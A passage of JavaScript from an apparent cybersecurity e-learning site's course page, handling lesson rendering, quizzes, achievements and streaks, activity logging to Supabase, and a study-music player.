          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
         await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase
            .from("profiles")
            .update({
              [counterType]: supabase.sql`${counterType} + 1`,
            })
            .eq("id", currentUser.id);

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
